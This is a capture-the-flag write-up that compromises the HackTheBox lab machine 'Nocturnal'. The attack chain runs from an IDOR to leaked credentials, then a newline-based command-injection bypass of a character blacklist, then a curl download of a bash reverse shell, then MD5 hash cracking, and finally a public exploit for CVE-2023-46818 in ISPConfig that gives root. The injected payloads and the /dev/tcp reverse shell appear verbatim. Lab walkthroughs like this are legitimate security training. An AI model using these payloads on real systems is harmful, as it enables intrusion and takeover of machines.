---
title: "HackTheBox - Nocturnal"
author: Nasrallah
description: ""
date: 2025-08-17 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, cve, commandinjection, idor]
img_path: /assets/img/hackthebox/machines/nocturnal
image:
    path: nocturnal.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[nocturnal](https://app.hackthebox.com/machines/nocturnal) starts by exploiting an idor to get a set of credentials that gives us access to an admin panel on the website. After that we exploit a command injection to get initial foothold. After that we crack a hash that we find on a db file to get access as another user. We find port listening locally and we forward it to exploit a code injection vulnerability to get root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.56.74
Host is up (0.52s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, 22 running open ssh on Ubuntu and port 80 running nginx web server and redirecting to `nocturnal.htb` domain.

### Web

After adding the domain to our `/etc/hosts` file, let's navigate to it

![page](1.png)

We see a login and register, Trying some default credentials but failed.

Let's register a new user.

![reg](2.png)

Now let's login.

![dashbord](3.png)

Trying to upload a random file here give us the error `Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.`

Let's upload a pdf file.

![upload](4.png)

We uploaded the file successfully, when I click on the file the website makes a request to `http://nocturnal.htb/view.php?username=sirius&file=file.pdf` which downloads the file to our machine.

Trying a different name give the following error.

![error](5.png)

It shows us the file available for the user we're logged in as (sirius).

Changing the value of username parameter gives another error.

![hake](6.png)

Trying the username `admin` gives the following:

![admin](7.png)

The user exists but there are no files to download, this clearly indicates an IDOR vulnerability

#### IDOR

Let's fuzz for other usernames using `ffuf` and give it our session cookie

```bash
ffuf -c -w /usr/share/seclists/Usernames/Names/names.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=file.pdf' -ac -H 'Cookie: PHPSESSID=5b9q8ei3otchhrovc1ts929nps'
```

```terminal
admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 129ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 134ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 140ms]
```

We got two more usernames, let's check them out.

![amanda](8.png)

We find a file in amanda's account named `privacy.odt`, let's download it.

> An .odt file is an OpenDocument Text file, a format used for word processing documents.

Trying to open the file fails, but we can unzip it and get the data inside it.

```terminal
[★]$ unzip privacy.odt             
Archive:  privacy.odt   
 extracting: mimetype   
   creating: Configurations2/accelerator/
   creating: Configurations2/images/Bitmaps/
   creating: Configurations2/toolpanel/
   creating: Configurations2/floater/  
   creating: Configurations2/statusbar/
   creating: Configurations2/toolbar/  
   creating: Configurations2/progressbar/
   creating: Configurations2/popupmenu/
   creating: Configurations2/menubar/  
  inflating: styles.xml 
  inflating: manifest.rdf
  inflating: content.xml
  inflating: meta.xml   
  inflating: settings.xml
 extracting: Thumbnails/thumbnail.png
  inflating: META-INF/manifest.xml
```

Grepping for `password` we find the following message inside `content.xml` file.

```text
Dear Amanda,

Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
```

Trying to ssh as amanda fails. Let's login in the website as amanda.

![web](9.png)

We can see a admin panel

![admin](10.png)

We can view files and make backups.

![backup](11.png)

Checking the admin.php file we can see that it uses zip to make the backup.

```bash
zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &
```

We can aso see a list of black listed characters that we can't put in the password parameter send with the backup request

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

[...]

$password = cleanEntry($_POST['password']);
```

One char that's missing from the list is line feed '\n'.

![poc](12.png)

We managed to run `ls` to list files.

## **Foothold**

Now I'll try `curl` to reach my python server.

```bash
curl+10.10.16.83
```

That failed, maybe it's because the space, I'll replace it with a tab `%09'

```bash
curl%0910.10.16.83
```

With that I managed to get a hit on my server, now I'll upload bash reverse shell and put in /tmp.

```bash
bash -i >& /dev/tcp/10.10.16.83/9001 0>&1
```

```text
password=arHkG7HAI68X8s1J%0acurl%0910.10.16.83/shell.sh%09-o%09/tmp/file.sh
```

I'll setup a listener and then execute the file

```text
password=arHkG7HAI68X8s1J%0abash%09/tmp/file.sh
```

```terminal
┌──[10.10.16.83]-[sirius💀parrot]-[25-08-16 20:48]-[~/ctf/htb/noc]
└──╼[★]$ nc -lvnp 9001
Listening on 0.0.0.0 9001                                                                      
Connection received on 10.10.11.64 52980                                                       
bash: cannot set terminal process group (836): Inappropriate ioctl for device                  
bash: no job control in this shell                                                             
www-data@nocturnal:~/nocturnal.htb$ python3 -c 'import pty; pty.spawn("/bin/bash")'            
<tb$ python3 -c 'import pty; pty.spawn("/bin/bash")'                                           
www-data@nocturnal:~/nocturnal.htb$ export TERM=xterm                                          
export TERM=xterm                                                                              
www-data@nocturnal:~/nocturnal.htb$ ^Z        
zsh: suspended  nc -lvnp 9001                                                                  

┌──[10.10.16.83]-[sirius💀parrot]-[25-08-16 20:50]-[~/ctf/htb/noc]                             
└──╼[★]$ stty raw -echo; fg                                                                    
[1]  + continued  nc -lvnp 9001                                                                
                                                                                               
www-data@nocturnal:~/nocturnal.htb$ id                                                         
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

We got a shell!

## **Privilege Escalation**

In the login.php file we see that it connects to a sqlite3 database.

```php
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
```

Let's enumerate the db.

```terminal
www-data@nocturnal:~/nocturnal_database$ sqlite3 nocturnal_database.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
uploads  users  
sqlite> select * from users
   ...> ;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
8|testytest|098f6bcd4621d373cade4e832627b4f6
9|sirius|093f966b4d14b19adf2835e4775e3aee
sqlite>
```

We got the hash of user tobias, let's crack it.

![crack](13.png)

The password is `slowmotionapocalypse`. We can now ssh to the box.

Listing listening ports we get the following:

```terminal
tobias@nocturnal:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                    
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                    
tcp6       0      0 :::22                   :::*                    LISTEN      -                    
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

Port 8080 is listening locally, let's forward it and check what it has.

```bash
ssh tobias@nocturnal.htb -L 8000:127.0.0.1:8080
```

![web](14.png)

We got a login page, I managed to login with `admin:slowmotionapocalypse`

![logged](15.png)

Going to the help page we find the version of the website `ISPConfig Version: 3.2.10p1`

A quick search on google we find it's vulnerable to php code injection [CVE-2023-46818](https://nvd.nist.gov/vuln/detail/CVE-2023-46818)

We can also find an exploit on github <https://github.com/bipbopbup/CVE-2023-46818-python-exploit>

Let's clone the repo an run the exploit.

```terminal
┌──[10.10.16.83]-[sirius💀parrot]-[25-08-16 21:50]-[~/ctf/htb/noc/CVE-2023-46818-python-exploit]
└──╼[★]$ python exploit.py http://127.0.0.1:8888 'admin' 'slowmotionapocalypse'                 
[+] Target URL: http://127.0.0.1:8888/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell
                                               
ispconfig-shell# whoami
root

```

We got root!

## **References**

<https://nvd.nist.gov/vuln/detail/CVE-2023-46818>

<https://github.com/bipbopbup/CVE-2023-46818-python-exploit>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
